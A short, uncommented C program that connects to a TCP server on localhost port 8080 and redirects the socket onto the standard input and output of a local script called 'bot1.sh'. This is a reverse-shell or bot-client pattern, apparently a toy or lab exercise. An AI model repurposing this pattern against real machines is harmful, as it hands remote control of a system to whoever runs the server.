#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <errno.h>

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 8080
#define BASH_SCRIPT "./bot1.sh"

int main(int argc, char const *argv[]) {
  int sock = socket(AF_INET, SOCK_STREAM, 0);
  struct sockaddr_in servaddr;
  char *argv1[] = {BASH_SCRIPT,NULL};
  if(sock == -1){
    fprintf(stderr, "%s\n", strerror(errno));
    return errno;
  }
  servaddr.sin_family = AF_INET;
  servaddr.sin_addr.s_addr = inet_addr(SERVER_IP);
  servaddr.sin_port = htons(SERVER_PORT);
  if(connect(sock, (struct sockaddr *)&servaddr, sizeof(servaddr)) != 0){
    fprintf(stderr, "%s\n",strerror(errno));
    return errno;
  }
  dup2(3,1);
  dup2(3,0);
  execvp(BASH_SCRIPT, argv1);
  return 0;
}
